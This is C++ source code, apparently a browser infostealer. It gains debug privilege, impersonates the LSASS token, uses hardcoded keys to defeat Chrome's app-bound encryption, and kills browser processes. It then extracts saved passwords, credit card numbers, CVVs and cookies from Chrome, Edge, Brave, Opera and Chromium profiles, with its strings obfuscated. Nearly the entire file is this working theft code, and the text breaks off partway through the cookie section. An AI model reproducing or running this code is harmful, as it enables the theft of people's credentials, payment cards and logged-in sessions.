#pragma once

#include <wil/resource.h>
#include <sqlite3.h>
#include <nlohmann/json.hpp>
#include <windows.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <ncrypt.h>
#include <bcrypt.h>
#include <dpapi.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <string>
#include <chrono>
#include <ctime>
#include <sstream>
#include <algorithm>
#include <memory>
#include <cstring>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ncrypt.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

using json = nlohmann::json;

// ----------------------------------------------------------------------
// Format WebKit timestamp
// ----------------------------------------------------------------------
inline std::string format_time(sqlite3_int64 micros) {
    if (micros == 0) return oxorany("");
    auto epoch_offset = std::chrono::seconds{11644473600LL};
    auto tp = std::chrono::system_clock::time_point{
        std::chrono::microseconds{micros} - epoch_offset };
    std::time_t tt = std::chrono::system_clock::to_time_t(tp);
    std::string ts = std::ctime(&tt);
    ts.pop_back();
    return ts;
}

// ----------------------------------------------------------------------
// Base64 decode
// ----------------------------------------------------------------------
inline std::vector<BYTE> Base64DecodeBytes(const std::string& encoded) {
    DWORD dwLen = 0;
    if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &dwLen, nullptr, nullptr))
        return {};
    std::vector<BYTE> decoded(dwLen);
    if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, decoded.data(), &dwLen, nullptr, nullptr))
        return {};
    return decoded;
}

inline std::string Base64DecodeString(const std::string& encoded) {
    auto bytes = Base64DecodeBytes(encoded);
    return std::string(bytes.begin(), bytes.end());
}

// ----------------------------------------------------------------------
// DPAPI Unprotect
// ----------------------------------------------------------------------
inline std::vector<BYTE> DPAPIUnprotect(const std::vector<BYTE>& data, DWORD flags) {
    DATA_BLOB input{ (DWORD)data.size(), const_cast<BYTE*>(data.data()) };
    DATA_BLOB output{ 0, nullptr };
    if (!CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, flags, &output))
        return {};
    std::vector<BYTE> result(output.pbData, output.pbData + output.cbData);
    LocalFree(output.pbData);
    return result;
}

// ----------------------------------------------------------------------
// Enable privilege
// ----------------------------------------------------------------------
inline bool EnablePrivilege(const std::wstring& privilege) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    LUID luid;
    if (!LookupPrivilegeValueW(nullptr, privilege.c_str(), &luid)) {
        CloseHandle(hToken);
        return false;
    }
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool result = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr);
    CloseHandle(hToken);
    return result;
}

// ----------------------------------------------------------------------
// Get LSASS PID
// ----------------------------------------------------------------------
inline DWORD GetLsassPID() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    DWORD pid = 0;
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return pid;
}

// ----------------------------------------------------------------------
// Impersonate LSASS (RAII)
// ----------------------------------------------------------------------
class Impersonate {
    HANDLE hDupToken = nullptr;
public:
    bool ImpersonateLsass() {
        if (!EnablePrivilege(SE_DEBUG_NAME)) return false;
        DWORD pid = GetLsassPID();
        if (pid == 0) return false;
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (!hProcess) return false;
        HANDLE hToken = nullptr;
        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hToken)) {
            CloseHandle(hProcess);
            return false;
        }
        if (!DuplicateTokenEx(hToken, GENERIC_ALL, nullptr, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
            CloseHandle(hToken);
            CloseHandle(hProcess);
            return false;
        }
        CloseHandle(hToken);
        CloseHandle(hProcess);
        if (!SetThreadToken(nullptr, hDupToken)) return false;
        return true;
    }
    void Revert() {
        if (hDupToken) {
            RevertToSelf();
            CloseHandle(hDupToken);
            hDupToken = nullptr;
        }
    }
    ~Impersonate() { Revert(); }
};

// ----------------------------------------------------------------------
// NCrypt decrypt wrapper
// ----------------------------------------------------------------------
inline std::vector<BYTE> NCryptDecryptData(const std::vector<BYTE>& inputData, const std::wstring& keyName) {
    NCRYPT_PROV_HANDLE hProvider{};
    if (NCryptOpenStorageProvider(&hProvider, MS_KEY_STORAGE_PROVIDER, 0) != ERROR_SUCCESS)
        return {};
    NCRYPT_KEY_HANDLE hKey = {};
    if (NCryptOpenKey(hProvider, &hKey, keyName.c_str(), 0, 0) != ERROR_SUCCESS) {
        NCryptFreeObject(hProvider);
        return {};
    }
    DWORD cbResult = 0;
    if (NCryptDecrypt(hKey, const_cast<BYTE*>(inputData.data()), (DWORD)inputData.size(),
        nullptr, nullptr, 0, &cbResult, NCRYPT_SILENT_FLAG) != ERROR_SUCCESS) {
        NCryptFreeObject(hKey);
        NCryptFreeObject(hProvider);
        return {};
    }
    std::vector<BYTE> decrypted(cbResult);
    if (NCryptDecrypt(hKey, const_cast<BYTE*>(inputData.data()), (DWORD)inputData.size(),
        nullptr, decrypted.data(), cbResult, &cbResult, NCRYPT_SILENT_FLAG) != ERROR_SUCCESS) {
        NCryptFreeObject(hKey);
        NCryptFreeObject(hProvider);
        return {};
    }
    decrypted.resize(cbResult);
    NCryptFreeObject(hKey);
    NCryptFreeObject(hProvider);
    return decrypted;
}

// ----------------------------------------------------------------------
// AES-GCM using BCrypt
// ----------------------------------------------------------------------
inline std::vector<BYTE> AES_GCM_Decrypt(const std::vector<BYTE>& key, const std::vector<BYTE>& iv,
    const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& tag) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0)))
        return {};
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCRYPT_KEY_HANDLE hKey = nullptr;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PBYTE)key.data(), (ULONG)key.size(), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = const_cast<PBYTE>(iv.data());
    authInfo.cbNonce = (ULONG)iv.size();
    authInfo.pbTag = const_cast<PBYTE>(tag.data());
    authInfo.cbTag = (ULONG)tag.size();
    std::vector<BYTE> plaintext(ciphertext.size());
    ULONG cbResult = 0;
    bool success = BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PBYTE)ciphertext.data(), (ULONG)ciphertext.size(),
        &authInfo, nullptr, 0, plaintext.data(), (ULONG)plaintext.size(),
        &cbResult, 0));
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (!success) return {};
    plaintext.resize(cbResult);
    return plaintext;
}

// ----------------------------------------------------------------------
// ChaCha20-Poly1305 (Windows 10 1703+)
// ----------------------------------------------------------------------
inline std::vector<BYTE> ChaCha20Poly1305_Decrypt(const std::vector<BYTE>& key, const std::vector<BYTE>& iv,
    const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& tag) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_CHACHA20_POLY1305_ALGORITHM, nullptr, 0)))
        return {};
    BCRYPT_KEY_HANDLE hKey = nullptr;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PBYTE)key.data(), (ULONG)key.size(), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = const_cast<PBYTE>(iv.data());
    authInfo.cbNonce = (ULONG)iv.size();
    authInfo.pbTag = const_cast<PBYTE>(tag.data());
    authInfo.cbTag = (ULONG)tag.size();
    std::vector<BYTE> plaintext(ciphertext.size());
    ULONG cbResult = 0;
    bool success = BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PBYTE)ciphertext.data(), (ULONG)ciphertext.size(),
        &authInfo, nullptr, 0, plaintext.data(), (ULONG)plaintext.size(),
        &cbResult, 0));
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (!success) return {};
    plaintext.resize(cbResult);
    return plaintext;
}

// ----------------------------------------------------------------------
// KeyBlob structures
// ----------------------------------------------------------------------
struct KeyBlob {
    std::vector<BYTE> header;
    BYTE flag = 0;
    std::vector<BYTE> iv;
    std::vector<BYTE> ciphertext;
    std::vector<BYTE> tag;
    std::vector<BYTE> encryptedAesKey;
};

struct KeyBlob2 {
    std::vector<BYTE> blob1;
    std::vector<BYTE> blob2;
};

inline KeyBlob ParseKeyBlob(const std::vector<BYTE>& blobData) {
    KeyBlob kb;
    if (blobData.size() < 9) return kb;
    size_t offset = 0;
    DWORD headerLen = *(DWORD*)&blobData[offset]; offset += 4;
    if (offset + headerLen > blobData.size()) return kb;
    kb.header.assign(blobData.begin() + offset, blobData.begin() + offset + headerLen); offset += headerLen;
    if (offset + 4 > blobData.size()) return kb;
    DWORD contentLen = *(DWORD*)&blobData[offset]; offset += 4;
    if (headerLen + contentLen + 8 != blobData.size()) return kb;
    kb.flag = blobData[offset++];
    if (kb.flag == 1 || kb.flag == 2) {
        if (offset + 12 > blobData.size()) return kb;
        kb.iv.assign(blobData.begin() + offset, blobData.begin() + offset + 12); offset += 12;
        if (offset + 32 > blobData.size()) return kb;
        kb.ciphertext.assign(blobData.begin() + offset, blobData.begin() + offset + 32); offset += 32;
        if (offset + 16 > blobData.size()) return kb;
        kb.tag.assign(blobData.begin() + offset, blobData.begin() + offset + 16);
    } else if (kb.flag == 3) {
        if (offset + 32 > blobData.size()) return kb;
        kb.encryptedAesKey.assign(blobData.begin() + offset, blobData.begin() + offset + 32); offset += 32;
        if (offset + 12 > blobData.size()) return kb;
        kb.iv.assign(blobData.begin() + offset, blobData.begin() + offset + 12); offset += 12;
        if (offset + 32 > blobData.size()) return kb;
        kb.ciphertext.assign(blobData.begin() + offset, blobData.begin() + offset + 32); offset += 32;
        if (offset + 16 > blobData.size()) return kb;
        kb.tag.assign(blobData.begin() + offset, blobData.begin() + offset + 16);
    }
    return kb;
}

inline KeyBlob2 ParseKeyBlob2(const std::vector<BYTE>& blobData) {
    KeyBlob2 kb;
    if (blobData.size() < 8) return kb;
    size_t offset = 0;
    DWORD blob1len = *(DWORD*)&blobData[offset]; offset += 4;
    if (blob1len > blobData.size() - offset) return kb;
    kb.blob1.assign(blobData.begin() + offset, blobData.begin() + offset + blob1len); offset += blob1len;
    if (offset + 4 > blobData.size()) return kb;
    DWORD blob2len = *(DWORD*)&blobData[offset]; offset += 4;
    if (blob2len > blobData.size() - offset) return kb;
    kb.blob2.assign(blobData.begin() + offset, blobData.begin() + offset + blob2len);
    return kb;
}

std::vector<BYTE> ByteXor(const std::vector<BYTE>& a, const std::vector<BYTE>& b) {
    size_t len = min(a.size(), b.size());
    std::vector<BYTE> result(len);
    for (size_t i = 0; i < len; i++) {
        result[i] = a[i] ^ b[i];
    }
    return result;
}

// ----------------------------------------------------------------------
// Derive v20 master key from KeyBlob
// ----------------------------------------------------------------------
inline std::vector<BYTE> DeriveV20MasterKey(const KeyBlob& kb) {
    switch (kb.flag) {
        case 1: {
            // Hardcoded AES key from elevation_service.exe
            std::vector<BYTE> aesKey = Base64DecodeBytes(oxorany("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c="));
            return AES_GCM_Decrypt(aesKey, kb.iv, kb.ciphertext, kb.tag);
        }
        case 2: {
            std::vector<BYTE> chachaKey = Base64DecodeBytes(oxorany("6Y831/Th+kM9GTBNwiWAQgkOLR1+6nZw1B9zjQhylmA="));
            return ChaCha20Poly1305_Decrypt(chachaKey, kb.iv, kb.ciphertext, kb.tag);
        }
        case 3: {
            Impersonate imp;
            if (!imp.ImpersonateLsass()) return {};
            std::vector<BYTE> decryptedAESKey = NCryptDecryptData(kb.encryptedAesKey, L"Google Chromekey1");
            if (decryptedAESKey.empty()) return {};
            std::vector<BYTE> xorKey = Base64DecodeBytes(oxorany("zPihzsVmBbhRdVK6Gi0GHAOinpAnT7L89Zukt1w5I5A="));
            std::vector<BYTE> xored = ByteXor(decryptedAESKey, xorKey);
            return AES_GCM_Decrypt(xored, kb.iv, kb.ciphertext, kb.tag);
        }
        default: return {};
    }
}

// ----------------------------------------------------------------------
// Get v20 master key from Local State (Chrome)
// ----------------------------------------------------------------------
inline std::vector<BYTE> GetV20MasterKey(const std::string& localStatePath) {
    std::ifstream file(localStatePath);
    if (!file.is_open()) return {};
    json data;
    try { data = json::parse(file); } catch (...) { return {}; }
    file.close();
    if (!data.contains(oxorany("os_crypt")) || !data[oxorany("os_crypt")].contains(oxorany("app_bound_encrypted_key"))) return {};
    std::string appBoundKey = data[oxorany("os_crypt")][oxorany("app_bound_encrypted_key")];
    if (appBoundKey.empty()) return {};
    std::vector<BYTE> encryptedKey = Base64DecodeBytes(appBoundKey);
    if (encryptedKey.size() < 4 || encryptedKey[0] != 'A' || encryptedKey[1] != 'P' || encryptedKey[2] != 'P' || encryptedKey[3] != 'B')
        return {};
    std::vector<BYTE> masterKey(encryptedKey.begin() + 4, encryptedKey.end());
    Impersonate imp;
    if (!imp.ImpersonateLsass()) return {};
    std::vector<BYTE> sysDecrypted = DPAPIUnprotect(masterKey, CRYPTPROTECT_LOCAL_MACHINE);
    if (sysDecrypted.empty()) return {};
    imp.Revert();
    std::vector<BYTE> userDecrypted = DPAPIUnprotect(sysDecrypted, CRYPTPROTECT_UI_FORBIDDEN);
    if (userDecrypted.empty()) return {};
    KeyBlob kb = ParseKeyBlob(userDecrypted);
    if (kb.flag == 0) return {};
    return DeriveV20MasterKey(kb);
}

// ----------------------------------------------------------------------
// Get v20.2 master key (Edge / Brave)
// ----------------------------------------------------------------------
inline std::vector<BYTE> GetV20_2MasterKey(const std::string& localStatePath) {
    std::ifstream file(localStatePath);
    if (!file.is_open()) return {};
    json data;
    try { data = json::parse(file); } catch (...) { return {}; }
    file.close();
    if (!data.contains(oxorany("os_crypt")) || !data[oxorany("os_crypt")].contains(oxorany("app_bound_encrypted_key"))) return {};
    std::string appBoundKey = data[oxorany("os_crypt")][oxorany("app_bound_encrypted_key")];
    if (appBoundKey.empty()) return {};
    std::vector<BYTE> encryptedKey = Base64DecodeBytes(appBoundKey);
    if (encryptedKey.size() < 4 || encryptedKey[0] != 'A' || encryptedKey[1] != 'P' || encryptedKey[2] != 'P' || encryptedKey[3] != 'B')
        return {};
    std::vector<BYTE> masterKey(encryptedKey.begin() + 4, encryptedKey.end());
    Impersonate imp;
    if (!imp.ImpersonateLsass()) return {};
    std::vector<BYTE> sysDecrypted = DPAPIUnprotect(masterKey, CRYPTPROTECT_LOCAL_MACHINE);
    if (sysDecrypted.empty()) return {};
    imp.Revert();
    std::vector<BYTE> userDecrypted = DPAPIUnprotect(sysDecrypted, CRYPTPROTECT_UI_FORBIDDEN);
    if (userDecrypted.empty()) return {};
    KeyBlob2 kb2 = ParseKeyBlob2(userDecrypted);
    if (kb2.blob2.empty()) return {};
    return kb2.blob2;  // In v20.2, blob2 is the raw master key
}

// ----------------------------------------------------------------------
// Get v10 master key (old encrypted_key)
// ----------------------------------------------------------------------
inline std::vector<BYTE> GetV10MasterKey(const std::string& localStatePath) {
    std::ifstream file(localStatePath);
    if (!file.is_open()) return {};
    json data;
    try { data = json::parse(file); } catch (...) { return {}; }
    file.close();
    if (!data.contains(oxorany("os_crypt")) || !data[oxorany("os_crypt")].contains(oxorany("encrypted_key"))) return {};
    std::string encKeyB64 = data[oxorany("os_crypt")][oxorany("encrypted_key")];
    if (encKeyB64.empty()) return {};
    std::vector<BYTE> encKey = Base64DecodeBytes(encKeyB64);
    if (encKey.size() <= 5) return {};
    std::vector<BYTE> keyBlob(encKey.begin() + 5, encKey.end());
    return DPAPIUnprotect(keyBlob, CRYPTPROTECT_UI_FORBIDDEN);
}

// ----------------------------------------------------------------------
// Decrypt a password blob (v10/v20/v20.2)
// ----------------------------------------------------------------------
inline std::string DecryptPasswordBlob(const std::vector<BYTE>& encryptedData, const std::vector<BYTE>& masterKey) {
    if (encryptedData.size() < 15 || masterKey.empty()) return oxorany("");
    // Old DPAPI encryption (prefix 0x01 0x00 0x00 0x00)
    if (encryptedData.size() >= 5 && encryptedData[0] == 0x01 && encryptedData[1] == 0x00 && encryptedData[2] == 0x00 && encryptedData[3] == 0x00) {
        std::vector<BYTE> data(encryptedData.begin() + 5, encryptedData.end());
        auto dec = DPAPIUnprotect(data, CRYPTPROTECT_UI_FORBIDDEN);
        if (!dec.empty()) return std::string(dec.begin(), dec.end());
        return oxorany("");
    }
    // v10/v20: prefix "v10" or "v20" (3 bytes)
    if (encryptedData.size() < 15) return oxorany("");
    std::vector<BYTE> iv(encryptedData.begin() + 3, encryptedData.begin() + 15);
    std::vector<BYTE> payload(encryptedData.begin() + 15, encryptedData.end());
    if (payload.size() < 16) return oxorany("");
    std::vector<BYTE> ciphertext(payload.begin(), payload.end() - 16);
    std::vector<BYTE> tag(payload.end() - 16, payload.end());
    auto plain = AES_GCM_Decrypt(masterKey, iv, ciphertext, tag);
    if (plain.empty()) return oxorany("");
    // Trim nulls / whitespace
    while (!plain.empty() && (plain.back() == 0 || plain.back() == '\r' || plain.back() == '\n'))
        plain.pop_back();
    return std::string(plain.begin(), plain.end());
}

namespace browers {

    using unique_sqlite3 = wil::unique_any<sqlite3*, decltype(&sqlite3_close), sqlite3_close>;
    using unique_sqlite3_stmt = wil::unique_any<sqlite3_stmt*, decltype(&sqlite3_finalize), sqlite3_finalize>;

    // ----------------------------------------------------------------------
    // Main browser enumeration and decryption class
    // ----------------------------------------------------------------------
    class c_browers {
    public:
        bool compile_browser() {
            BOOL isAdmin = FALSE;
            PSID adminGroup = nullptr;
            SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
            AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &adminGroup);
            CheckTokenMembership(nullptr, adminGroup, &isAdmin);
            FreeSid(adminGroup);
            if (!isAdmin) {
                g_compiler->push_line(oxorany("ERROR: This program must be run as Administrator to decrypt v20 passwords."));
                return false;
            }

            char* local_appdata = nullptr;
            char* roaming_appdata = nullptr;
            size_t len;
            _dupenv_s(&local_appdata, &len, oxorany("LOCALAPPDATA"));
            _dupenv_s(&roaming_appdata, &len, oxorany("APPDATA"));
            if (!local_appdata || !roaming_appdata) {
                g_compiler->push_line(oxorany("Failed to get AppData paths."));
                free(local_appdata); free(roaming_appdata);
                return false;
            }
            std::string local = local_appdata;
            std::string roaming = roaming_appdata;
            free(local_appdata); free(roaming_appdata);

            struct BrowserInfo {
                std::string name;
                std::filesystem::path path;
                int encryptionType;          // 0=v10, 1=v20, 2=v20_2
                std::string processName;     // e.g., "chrome.exe", "msedge.exe"
            };
            std::vector<BrowserInfo> browsers = {
                { oxorany("Chrome"),        local + oxorany("\\Google\\Chrome\\User Data"),         1, oxorany("chrome.exe") },
                { oxorany("Chrome Beta"),   local + oxorany("\\Google\\Chrome Beta\\User Data"),    1, oxorany("chrome.exe") },
                { oxorany("Chrome Canary"), local + oxorany("\\Google\\Chrome SxS\\User Data"),     0, oxorany("chrome.exe") },
                { oxorany("Chromium"),      local + oxorany("\\Chromium\\User Data"),               0, oxorany("chrome.exe") },
                { oxorany("Edge"),          local + oxorany("\\Microsoft\\Edge\\User Data"),        2, oxorany("msedge.exe") },
                { oxorany("Brave"),         local + oxorany("\\BraveSoftware\\Brave-Browser\\User Data"), 2, oxorany("brave.exe") },
                { oxorany("Opera"),         roaming + oxorany("\\Opera Software\\Opera Stable"),    0, oxorany("opera.exe") }
            };

            for (const auto& b : browsers) {
                namespace fs = std::filesystem;
                if (!fs::exists(b.path)) {
                    continue;
                }

                utility::kill_process(b.processName.c_str());

                fs::path localStatePath = b.path / oxorany("Local State");
                if (!fs::exists(localStatePath)) continue;

                // Derive master key
                std::vector<BYTE> masterKey;
                if (b.encryptionType == 1) {
                    masterKey = GetV20MasterKey(localStatePath.string());
                    if (masterKey.empty()) masterKey = GetV10MasterKey(localStatePath.string());
                } else if (b.encryptionType == 2) {
                    masterKey = GetV20_2MasterKey(localStatePath.string());
                    if (masterKey.empty()) masterKey = GetV10MasterKey(localStatePath.string());
                } else {
                    masterKey = GetV10MasterKey(localStatePath.string());
                }

                if (masterKey.empty()) {
                    g_compiler->push_line(b.name + oxorany(" failed to get master key."));
                    continue;
                }

                // Find profiles
                std::vector<fs::path> profiles;
                fs::path default_profile = b.path / oxorany("Default");
                if (fs::exists(default_profile / oxorany("Login Data")))
                    profiles.push_back(default_profile);
                try {
                    for (const auto& entry : fs::directory_iterator(b.path)) {
                        if (fs::is_directory(entry.path())) {
                            std::string dirname = entry.path().filename().string();
                            if (dirname.find(oxorany("Profile")) == 0 || dirname == oxorany("Default")) {
                                if (fs::exists(entry.path() / oxorany("Login Data")))
                                    profiles.push_back(entry.path());
                            }
                        }
                    }
                } catch (...) {}
                if (b.name == oxorany("Opera") && fs::exists(b.path / oxorany("Login Data")))
                    profiles.push_back(b.path);
                std::sort(profiles.begin(), profiles.end());
                profiles.erase(std::unique(profiles.begin(), profiles.end()), profiles.end());

                for (const auto& profile_path : profiles) {
                    // ----- Passwords (Login Data) -----
                    fs::path logins_path = profile_path / oxorany("Login Data");
                    if (fs::exists(logins_path)) {
                        fs::path temp_logins = fs::temp_directory_path() / (oxorany("LoginData_") + std::to_string(GetCurrentProcessId()) + oxorany(".db"));
                        fs::copy_file(logins_path, temp_logins, fs::copy_options::overwrite_existing);
                        sqlite3* db_raw = nullptr;
                        if (sqlite3_open(temp_logins.string().c_str(), &db_raw) == SQLITE_OK) {
                            unique_sqlite3 db(db_raw);
                            sqlite3_busy_timeout(db.get(), 1000);
                            const char* query = oxorany("SELECT origin_url, username_value, password_value, times_used, date_created, date_last_used, date_password_modified FROM logins");
                            sqlite3_stmt* stmt_raw = nullptr;
                            if (sqlite3_prepare_v2(db.get(), query, -1, &stmt_raw, nullptr) == SQLITE_OK) {
                                unique_sqlite3_stmt stmt(stmt_raw);
                                g_compiler->push_line(b.name + oxorany(" Logins:"));
                                while (sqlite3_step(stmt.get()) == SQLITE_ROW) {
                                    std::string url = (const char*)sqlite3_column_text(stmt.get(), 0);
                                    std::string username = (const char*)sqlite3_column_text(stmt.get(), 1);
                                    const void* blob = sqlite3_column_blob(stmt.get(), 2);
                                    int blob_size = sqlite3_column_bytes(stmt.get(), 2);
                                    int times_used = sqlite3_column_int(stmt.get(), 3);
                                    sqlite3_int64 created = sqlite3_column_int64(stmt.get(), 4);
                                    sqlite3_int64 last_used = sqlite3_column_int64(stmt.get(), 5);
                                    sqlite3_int64 modified = sqlite3_column_int64(stmt.get(), 6);
                                    std::string password;
                                    if (blob && blob_size > 0) {
                                        std::vector<BYTE> encData((BYTE*)blob, (BYTE*)blob + blob_size);
                                        password = DecryptPasswordBlob(encData, masterKey);
                                        if (password.empty()) password = oxorany("<decryption failed>");
                                    } else {
                                        password = oxorany("<empty>");
                                    }
                                    g_compiler->push_line(oxorany("URL: ") + url);
                                    g_compiler->push_line(oxorany("Username: ") + username);
                                    g_compiler->push_line(oxorany("Password: ") + password);
                                    if (times_used) g_compiler->push_line(oxorany("Times used: ") + std::to_string(times_used));
                                    if (created) g_compiler->push_line(oxorany("Created: ") + format_time(created));
                                    if (last_used) g_compiler->push_line(oxorany("Last used: ") + format_time(last_used));
                                    if (modified) g_compiler->push_line(oxorany("Password modified: ") + format_time(modified));
                                    g_compiler->push_line(oxorany(""));
                                }
                            }
                        }
                        (temp_logins);
                    }

                    fs::path webdata_path = profile_path / oxorany("Web Data");
                    if (fs::exists(webdata_path)) {
                        fs::path temp_webdata = fs::temp_directory_path() / (oxorany("WebData_") + std::to_string(GetCurrentProcessId()) + oxorany(".db"));
                        try {
                            fs::copy_file(webdata_path, temp_webdata, fs::copy_options::overwrite_existing);
                        } catch (const fs::filesystem_error& e) {
                            g_compiler->push_line(b.name + oxorany(" failed to copy Web Data: ") + e.what());
                            continue;
                        }

                        sqlite3* db_raw = nullptr;
                        if (sqlite3_open(temp_webdata.string().c_str(), &db_raw) != SQLITE_OK) {
                            g_compiler->push_line(oxorany("Failed to open Web Data for ") + b.name);
                            (temp_webdata);
                            continue;
                        }
                        unique_sqlite3 db(db_raw);
                        sqlite3_busy_timeout(db.get(), 1000);

                        struct CardInfo {
                            std::string guid;
                            std::string name;
                            std::string month;
                            std::string year;
                            std::string number;
                            int64_t date_modified;
                        };

                        std::vector<CardInfo> cards;
                        const char* card_query = oxorany("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards");
                        sqlite3_stmt* card_stmt = nullptr;
                        if (sqlite3_prepare_v2(db.get(), card_query, -1, &card_stmt, nullptr) == SQLITE_OK) {
                            while (sqlite3_step(card_stmt) == SQLITE_ROW) {
                                CardInfo card;
                                // Safely handle nulls
                                const char* guid_text = (const char*)sqlite3_column_text(card_stmt, 0);
                                const char* name_text = (const char*)sqlite3_column_text(card_stmt, 1);
                                const char* month_text = (const char*)sqlite3_column_text(card_stmt, 2);
                                const char* year_text = (const char*)sqlite3_column_text(card_stmt, 3);
                                if (guid_text) card.guid = guid_text;
                                if (name_text) card.name = name_text;
                                if (month_text) card.month = month_text;
                                if (year_text) card.year = year_text;
                                const void* blob = sqlite3_column_blob(card_stmt, 4);
                                int blob_size = sqlite3_column_bytes(card_stmt, 4);
                                card.date_modified = sqlite3_column_int64(card_stmt, 5);
                                if (blob && blob_size > 0) {
                                    std::vector<BYTE> encData((BYTE*)blob, (BYTE*)blob + blob_size);
                                    card.number = DecryptPasswordBlob(encData, masterKey);
                                    if (card.number.empty()) card.number = oxorany("<decryption failed>");
                                } else {
                                    card.number = oxorany("<empty>");
                                }
                                cards.push_back(card);
                            }
                            sqlite3_finalize(card_stmt);
                        }

                        std::unordered_map<std::string, std::string> cvv_map;
                        const char* cvv_query = oxorany("SELECT guid, value_encrypted FROM local_stored_cvc WHERE value_encrypted IS NOT NULL");
                        sqlite3_stmt* cvv_stmt = nullptr;
                        if (sqlite3_prepare_v2(db.get(), cvv_query, -1, &cvv_stmt, nullptr) == SQLITE_OK) {
                            while (sqlite3_step(cvv_stmt) == SQLITE_ROW) {
                                const char* guid_text = (const char*)sqlite3_column_text(cvv_stmt, 0);
                                if (!guid_text) continue;
                                std::string guid = guid_text;
                                const void* blob = sqlite3_column_blob(cvv_stmt, 1);
                                int blob_size = sqlite3_column_bytes(cvv_stmt, 1);
                                if (blob && blob_size > 0) {
                                    std::vector<BYTE> encData((BYTE*)blob, (BYTE*)blob + blob_size);
                                    std::string cvv = DecryptPasswordBlob(encData, masterKey);
                                    if (!cvv.empty()) cvv_map[guid] = cvv;
                                }
                            }
                            sqlite3_finalize(cvv_stmt);
                        }

                        if (!cards.empty()) {
                            g_compiler->push_line(b.name + oxorany(" Credit Cards:"));
                            for (const auto& card : cards) {
                                if (!card.name.empty())
                                    g_compiler->push_line(oxorany("Cardholder: ") + card.name);
                                if (!card.month.empty() && !card.year.empty())
                                    g_compiler->push_line(oxorany("Expiry: ") + card.month + oxorany("/") + card.year);
                                if (!card.number.empty())
                                    g_compiler->push_line(oxorany("Number: ") + card.number);
                                auto it = cvv_map.find(card.guid);
                                if (it != cvv_map.end()) {
                                    g_compiler->push_line(oxorany("CVV: ") + it->second);
                                } else {
                                    g_compiler->push_line(oxorany("CVV: <not saved>"));
                                }
                                g_compiler->push_line(oxorany(""));
                            }
                        }
                    }

                    // -----  -----
                    fs::path cookies_path = profile_path / oxorany("Network") / oxorany("Cookies");
                    if (fs::exists(cookies_path)) {
                        fs::path temp_cookies = fs::temp_directory_path() / (oxorany("Cookies_") + std::to_string(GetCurrentProcessId()) + oxorany(".db"));
                        try {
                            fs::copy_file(cookies_path, temp_cookies, fs::copy_options::overwrite_existing);
                        } catch (const fs::filesystem_error& e) {
                            g_compiler->push_line(b.name + oxorany(" failed to copy Cookies: ") + e.what());
                            continue;
                        }

                        sqlite3* db_raw = nullptr;
                        if (sqlite3_open(temp_cookies.string().c_str(), &db_raw) != SQLITE_OK) {
                            g_compiler->push_line(oxorany("Failed to open Cookies for ") + b.name);
                            (temp_cookies);
                            continue;
                        }
                        unique_sqlite3 db(db_raw);
                        sqlite3_busy_timeout(db.get(), 1000);

